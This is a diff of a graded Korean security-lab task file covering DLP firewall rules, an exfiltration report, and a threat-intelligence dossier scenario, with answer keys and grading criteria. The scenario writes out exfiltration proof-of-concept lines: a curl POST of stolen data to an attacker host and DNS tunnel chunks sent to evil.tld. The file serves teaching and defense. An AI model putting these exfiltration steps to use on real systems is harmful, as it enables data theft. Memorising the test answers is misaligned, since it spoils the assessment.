-  answer_detail: 방화벽 기반 DLP는 아웃바운드 트래픽을 제한하여 대량 데이터 유출을 방지한다. DNS 서버를 내부로 제한하고, 대용량 전송을 로깅하며, ICMP 페이로드
-    크기를 제한하는 것이 기본 정책이다.
+  answer: 'echo -e ''=== DLP Firewall Rules (nftables) ===\n\n# Rate limit outbound
+    connections\nadd rule inet filter output tcp dport {80, 443} ct state new limit
+    rate 10/minute burst 20 accept\nadd rule inet filter output tcp dport {80, 443}
+    ct state new drop\n\n# Block DNS to non-approved servers\nadd rule inet filter
+    output udp dport 53 ip daddr != 10.20.30.1 drop\n\n# Log large outbound transfers\nadd
+    rule inet filter output ct bytes > 10485760 log prefix "LARGE_TRANSFER: " accept\n\n#
+    Block ICMP with large payload\nadd rule inet filter output icmp type echo-request
+    meta length > 100 drop'''
+  answer_detail: 방화벽 기반 DLP는 아웃바운드 트래픽을 제한하여 대량 데이터 유출을 방지한다. DNS 서버를 내부로 제한하고, 대용량
+    전송을 로깅하며, ICMP 페이로드 크기를 제한하는 것이 기본 정책이다.
   verify:
     type: output_contains
     expect: DLP Firewall Rules
     field: stdout
     semantic:
-      intent: nftables DLP 룰 — rate limit 10/min HTTP + DNS 내부 서버 제한 + ct bytes >10MB 로그 + ICMP meta length
-        >100 drop. NIST SP 800-41 egress filtering. 대역 제한 + 목적지 화이트리스트 + 대용량 로깅 + ICMP 페이로드 제한 4계층.
+      intent: nftables DLP 룰 — rate limit 10/min HTTP + DNS 내부 서버 제한 + ct bytes >10MB
+        로그 + ICMP meta length >100 drop. NIST SP 800-41 egress filtering. 대역 제한 +
+        목적지 화이트리스트 + 대용량 로깅 + ICMP 페이로드 제한 4계층.
       success_criteria:
       - DLP Firewall Rules 키워드
       - rate limit + ct bytes + ICMP 제한 3종 이상
@@ -452,28 +484,33 @@ steps:
       - 임계치 없음
   target_vm: attacker
 - order: 15
-  instruction: 데이터 유출 실습 결과를 /tmp/exfiltration_report.txt에 정리하라. 유출 채널, 기법, 탐지/방어 방안을 포함하라.
+  instruction: 데이터 유출 실습 결과를 /tmp/exfiltration_report.txt에 정리하라. 유출 채널, 기법, 탐지/방어
+    방안을 포함하라.
   hint: 각 유출 채널의 장단점과 탐지 가능성을 비교한다
   category: analysis
   points: 15
-  answer: 'echo -e ''=== Data Exfiltration Report ===\n\n[Data Collected]\n- User credentials from JuiceShop
-    API\n- Configuration files from web server\n\n[Exfiltration Channels]\n1. HTTP POST: Easy, blends
-    with normal traffic\n2. DNS Tunneling: Bypasses most firewalls\n3. ICMP Tunneling: Often overlooked\n4.
-    Cloud Services: HTTPS encrypted\n5. Steganography: Hidden in media files\n\n[Evasion Techniques]\n-
-    Encryption (AES-256)\n- Encoding (Base64, Hex)\n- Chunking (Low-and-Slow)\n- Compression (tar.gz)\n\n[Detection/Prevention]\n1.
-    DLP solution with SSL inspection\n2. DNS monitoring (query length, volume)\n3. Egress filtering (whitelist
-    outbound)\n4. UEBA for anomalous data access\n5. Network traffic analysis (NTA)'' > /tmp/exfiltration_report.txt
+  answer: 'echo -e ''=== Data Exfiltration Report ===\n\n[Data Collected]\n- User
+    credentials from JuiceShop API\n- Configuration files from web server\n\n[Exfiltration
+    Channels]\n1. HTTP POST: Easy, blends with normal traffic\n2. DNS Tunneling: Bypasses
+    most firewalls\n3. ICMP Tunneling: Often overlooked\n4. Cloud Services: HTTPS
+    encrypted\n5. Steganography: Hidden in media files\n\n[Evasion Techniques]\n-
+    Encryption (AES-256)\n- Encoding (Base64, Hex)\n- Chunking (Low-and-Slow)\n- Compression
+    (tar.gz)\n\n[Detection/Prevention]\n1. DLP solution with SSL inspection\n2. DNS
+    monitoring (query length, volume)\n3. Egress filtering (whitelist outbound)\n4.
+    UEBA for anomalous data access\n5. Network traffic analysis (NTA)'' > /tmp/exfiltration_report.txt
     && cat /tmp/exfiltration_report.txt'
-  answer_detail: 데이터 유출 보고서는 수집 데이터, 사용 채널, 회피 기법, 탐지/방어 방안을 종합적으로 다뤄야 한다. 조직의 가장 가치 있는 데이터가 무엇이고, 어떤
-    경로로 유출될 수 있는지를 평가한다.
+  answer_detail: 데이터 유출 보고서는 수집 데이터, 사용 채널, 회피 기법, 탐지/방어 방안을 종합적으로 다뤄야 한다. 조직의 가장
+    가치 있는 데이터가 무엇이고, 어떤 경로로 유출될 수 있는지를 평가한다.
   verify:
     type: output_contains
-    expect: Data Exfiltration Report
+    expect:
+    - Data Exfiltration Report
+    - report
     field: stdout
     semantic:
-      intent: '유출 보고서 — echo > /tmp/exfiltration_report.txt: [Channels] HTTP/DNS/ICMP/Cloud/Stego 5종 +
-        [Evasion] 암호화/인코딩/청킹/압축 + [Detection] DLP+SSL 검사/DNS 모니터링/egress 필터/UEBA/NTA. MITRE T1048/T1041/T1567/T1027.003
-        매핑.'
+      intent: '유출 보고서 — echo > /tmp/exfiltration_report.txt: [Channels] HTTP/DNS/ICMP/Cloud/Stego
+        5종 + [Evasion] 암호화/인코딩/청킹/압축 + [Detection] DLP+SSL 검사/DNS 모니터링/egress 필터/UEBA/NTA.
+        MITRE T1048/T1041/T1567/T1027.003 매핑.'
       success_criteria:
       - Data Exfiltration Report 키워드
       - Channels + Evasion + Detection 3섹션
@@ -487,3 +524,92 @@ steps:
       - 채널 3개 이하
       - Detection/방어 없음
   target_vm: attacker
+- order: 99
+  instruction: |
+    [복합 시나리오] "백신회사 위협 인텔리전스 분석가 — APT Dossier (Diamond Model + STIX IoC)"
+
+    ## 상황 — 신규 캠페인 발견, 분석 dossier
+
+    당신은 *Vaccino* CTI Lead 7년차. 협력사 SOC 가 비정상 데이터 유출 패턴 5건 신고.
+    3일 내 Diamond Model + STIX 2.1 IoC bundle 작성. 결과물 FS-ISAC 공유.
+
+    > [협력사 SOC head] "DNS 평소 50바이트, 어제 새벽 200~250바이트 폭증. Suricata 안 떠.
+    > 누가·뭘·다음에 뭐 올지 분석 부탁."
+
+    학습 목표 (lecture #2 SUID/sudo + #5 커널 CVE) + (lab #1·#2·#5·#7·#9 식별/SQLi/DNS/AES/스테가) 통합.
+
+    ## 산출물 — 4 파트 dossier
+
+    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
+
+    ### Part 1 — Diamond Model 4 vertices
+    Adversary (APT-X cluster, cyber crime / state-aligned) ↔ Capability (T1048.003 DNS exfil + T1027 obfuscation
+    + T1029 scheduled + T1071.004 DNS C2 + T1001.002 stego) ↔ Infrastructure (ns1.evil.tld, .info/.top DGA,
+    pastebin clone) ↔ Victim (금융권 핀테크, 사용자 DB, 5,000 PII).
+
+    ### Part 2 — 5 exfil PoC
+    1) HTTP+base64 (T1041): `echo "user1:hash1,user2:hash2" | base64 -w0 > /tmp/loot.b64; wc -c /tmp/loot.b64`
+       `echo "[POC] curl -X POST -d @/tmp/loot.b64 https://attacker/upload (실 전송 X)"`
+    2) DNS 터널 (T1048.003):
+       `python3 -c "import base64; data=open('/tmp/loot.b64').read().strip(); ch=[data[i:i+50] for i in range(0,min(len(data),200),50)]; [print(c+'.evil.tld') for c in ch[:4]]"`
+    3) AES-256 (T1027): `echo "secret-token" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:DEMO123 -base64 2>/dev/null | head -3`
+    4) Low-Slow (T1029): `for i in 1 2 3; do echo "chunk $i sent at $(date +%H:%M:%S) (실 전송 X)"; done`
+    5) Stego (T1001.002): `echo "[POC] steghide embed -cf cover.jpg -ef secret -p DEMO -sf out.jpg (실 X)"`
+
+    ### Part 3 — STIX 2.1 bundle (4 indicator)
+    `cat <<'EOF'
+    {
+      "type": "bundle",
+      "id": "bundle--apt-x-2026-04-29",
+      "objects": [
+        {"type":"indicator","id":"indicator--apt-x-dns-1","pattern":"[domain-name:value MATCHES '^[a-zA-Z0-9+/=]{40,}\\.evil\\.tld$']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X DNS exfil"},
+        {"type":"indicator","id":"indicator--apt-x-c2-2","pattern":"[ipv4-addr:value = '203.0.113.99']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X C2 IP"},
+        {"type":"indicator","id":"indicator--apt-x-stego-3","pattern":"[file:hashes.'SHA-256' = 'b5e3...']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X stego template"},
+        {"type":"indicator","id":"indicator--apt-x-aes-4","pattern":"[file:content_ref.payload_bin MATCHES 'Salted__']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"OpenSSL AES magic"}
+      ]
+    }
+    EOF`
+
+    ### Part 4 — ISAC 공유 권고 3
+    1. DNS 쿼리 길이 100바이트 임계 → Wazuh 룰 100500 (60일 hot)
+    2. egress :443 non-CDN flow-rate >10MB/min alert
+    3. JPEG/PNG 업로드 metadata stripping (DLP CT-INSPECT)
+
+    종료: echo "=== APT-X Dossier ===" + 4 파트 모두.
+  hint: |
+    Part 1 Diamond 4 vertices + ATT&CK 매핑.
+    Part 2 5 exfil PoC (POC 텍스트, 실 전송 X).
+    Part 3 STIX 2.1 bundle JSON (4 indicator).
+    Part 4 ISAC 권고 3.
+    포인트: CTI dossier — Diamond + STIX 양식.
+  category: integration_scenario
+  points: 50
+  verify:
+    type: output_contains
+    expect: Dossier
+    field: stdout
+    semantic:
+      intent: |
+        위협 인텔 분석가 페르소나 — APT-X dossier:
+        Diamond Model 4 vertices + 5 exfil PoC + STIX 2.1 bundle 4 indicator + ISAC 권고 3.
+        lecture w11 + lab #1·#2·#5·#7·#9 동시 행동 증명. *CTI dossier* 산출물.
+      success_criteria:
+      - Diamond Model 4 vertices
+      - 5 exfil PoC + ATT&CK ID
+      - STIX 2.1 bundle JSON (4 indicator)
+      - ISAC 권고 3
+      acceptable_methods:
+      - heredoc Diamond / STIX JSON
+      - base64 / openssl / python3
+      - 실 전송 X (POC 텍스트)
+      - markdown / ASCII
+      negative_signs:
+      - Diamond 누락
+      - STIX JSON 형식 X
+      - exfil 3 이하
+      - ISAC 권고 누락
+      - 매트릭스/슬라이드 형식
+  target_vm: attacker
+  risk_level: low
+  answer_detail: |
+    학생이 ssh attacker 직접. CTI dossier — Diamond + STIX 양식. ISAC 공유. 실 전송 X.
